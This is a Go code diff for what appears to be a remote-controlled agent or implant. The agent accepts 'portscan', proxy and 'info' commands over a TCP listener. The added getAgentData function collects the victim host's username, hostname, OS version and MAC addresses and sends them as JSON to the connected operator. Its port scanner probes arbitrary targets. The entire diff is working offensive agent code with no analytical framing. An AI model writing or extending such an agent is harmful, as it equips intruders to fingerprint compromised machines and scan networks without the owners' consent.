@@ -2,14 +2,18 @@ package main
 
 import (
 	"bufio"
+	"encoding/json"
 	"fmt"
 	"io/ioutil"
 	"net"
 	"os"
 	"os/exec"
+	"os/user"
 	"regexp"
+	"runtime"
 	"strconv"
 	"strings"
+	"syscall"
 	"time"
 
 	"github.com/akamensky/argparse"
@@ -33,6 +37,15 @@ type Process struct {
 	Name string
 	PID  int
 	UID  int
+}
+
+type SessionIdentifier struct {
+	OS         string
+	Username   string
+	OsVersion  string
+	any        any
+	Hostname   string
+	MACAddress []string
 }
 
 func (proc Process) ToString() string {
@@ -147,10 +160,13 @@ func ScanPort(cnfg Config) error {
 	return nil
 }
 
-func handleFlags(input string) Config {
+func handlePortScannerFlags(input string) Config {
 	cnfg := Config{}
 	r := regexp.MustCompile(`(-ports|-target|-delay|-time|--[a-zA-Z]+)\s+(\S+)`)
 	matches := r.FindAllStringSubmatch(input, -1)
+	if len(matches) == 0 {
+		portscanHelp(conf.Connection)
+	}
 	for _, m := range matches {
 		if strings.Contains(m[1], "-ports") {
 			portarr := strings.Split(m[2], ",")
@@ -233,6 +249,76 @@ func getNetworkInfo() {
 	conf.Connection.Write([]byte(info))
 }
 
+func getAgentData() {
+	info := SessionIdentifier{}
+	user, err := user.Current()
+	if err != nil {
+		fmt.Println(err)
+	}
+	username := user.Username
+	info.Username = username
+	host, err := os.Hostname()
+	if err != nil {
+		fmt.Println(err)
+	}
+	info.Hostname = host
+	info.OS = runtime.GOOS
+	ifaces, err := net.Interfaces()
+	if err != nil {
+		fmt.Println(err)
+	}
+	var addresses []string
+	for _, iface := range ifaces {
+		if iface.HardwareAddr.String() != "" {
+			addresses = append(addresses, iface.HardwareAddr.String())
+		}
+	}
+	info.MACAddress = addresses
+	if runtime.GOOS == "windows" {
+		// var (
+		// 	kernel32     = syscall.NewLazyDLL("kernel32.dll")
+		// 	getVersionEx = kernel32.NewProc("GetVersionExW")
+		// 	verExInfo    = struct {
+		// 		dwOSVersionInfoSize uint32
+		// 		dwMajorVersion      uint32
+		// 		dwMinorVersion      uint32
+		// 		dwBuildNumber       uint32
+		// 		dwPlatformId        uint32
+		// 		szCSDVersion        [128]uint16
+		// 	}{}
+		// )
+		// verExInfo.dwOSVersionInfoSize = uint32(unsafe.Sizeof(verExInfo))
+		// r, _, _ := getVersionEx.Call(uintptr(unsafe.Pointer(&verExInfo)))
+		// if r == 0 {
+		// 	fmt.Println("failed to get windows version")
+		// }
+		// version := fmt.Sprintf("Windows %d.%d build %d platform %d\n", verExInfo.dwMajorVersion, verExInfo.dwMinorVersion, verExInfo.dwBuildNumber, verExInfo.dwPlatformId)
+		version := "NOT IMPLEMENTED YET"
+		info.OsVersion = version
+	} else if runtime.GOOS == "linux" {
+		var sysinfo syscall.Utsname
+		if err := syscall.Uname(&sysinfo); err != nil {
+			fmt.Println(err)
+		}
+		version := fmt.Sprintf("Unix %s %s %s %s %s\n", byteToStr(sysinfo.Sysname[:]), byteToStr(sysinfo.Nodename[:]), byteToStr(sysinfo.Release[:]), byteToStr(sysinfo.Version[:]), byteToStr(sysinfo.Machine[:]))
+		info.OsVersion = version
+	}
+	ser, err := json.Marshal(info)
+	WriteClient(string(ser))
+}
+
+func byteToStr(b []int8) string {
+	str := make([]byte, len(b))
+	var i int
+	for ; i < len(b); i++ {
+		if b[i] == 0 {
+			break
+		}
+		str[i] = uint8(b[i])
+	}
+	return string(str[:i])
+}
+
 func HandleConnection(conn net.Conn) {
 	defer conn.Close()
 	scanner := bufio.NewScanner(conn)
@@ -245,14 +331,10 @@ func HandleConnection(conn net.Conn) {
 		switch parts[0] {
 		case "portscan":
 			if len(parts) == 1 {
-				conn.Write([]byte(fmt.Sprintln("Missing arguments")))
-				conn.Write([]byte(fmt.Sprintln("	-ports=<ports>: ports to scan. for multiple ports, split using a period (,) (required)")))
-				conn.Write([]byte(fmt.Sprintln("	-delay=<time>: delay between requests")))
-				conn.Write([]byte(fmt.Sprintln("	-time=<time>: timeout in seconds")))
-				conn.Write([]byte(fmt.Sprintln("	-target=<target>: target to scan")))
+				portscanHelp(conn)
 				continue
 			}
-			cnfg := handleFlags(line)
+			cnfg := handlePortScannerFlags(line)
 			err := ScanPort(cnfg)
 			if err != nil {
 				conn.Write([]byte(fmt.Sprintf("Error: %v\n", err)))
@@ -294,10 +376,23 @@ func HandleConnection(conn net.Conn) {
 				fmt.Printf("Starting proxy. PID %d\n", os.Getpid())
 				conf.Connection.Write([]byte(fmt.Sprintf("Starting proxy. PID %d\n", os.Getpid())))
 			}()
+		case "info":
+			getAgentData()
 		default:
 			conn.Write([]byte("Error: unknown command\n"))
 		}
 	}
+}
+
+func portscanHelp(conn net.Conn) {
+	helpmsg := `
+	Missing arguments
+		-ports=<ports>: ports to scan. for multiple ports, split using a period (,) (required)
+		-delay=<time>: delay between requests
+		-time=<time>: timeout in seconds
+		-target=<target>: target to scan
+	`
+	conn.Write([]byte(helpmsg))
 }
 
 var conf = InitConf{}
@@ -316,6 +411,11 @@ func main() {
 	if *verbosity {
 		verbose = true
 	}
+	Connect(client, port)
+
+}
+
+func Connect(client *string, port *int) {
 	target := fmt.Sprintf("%s:%d", *client, *port)
 	conf.Host = *client
 	conf.Port = *port
@@ -323,7 +423,6 @@ func main() {
 	ln, err := net.Listen("tcp", target)
 	if err != nil {
 		conf.Connection.Write([]byte(err.Error()))
-		return
 	}
 	defer ln.Close()
 	for {
@@ -338,5 +437,4 @@ func main() {
 		fmt.Println("------------------------")
 		go HandleConnection(conn)
 	}
-
 }
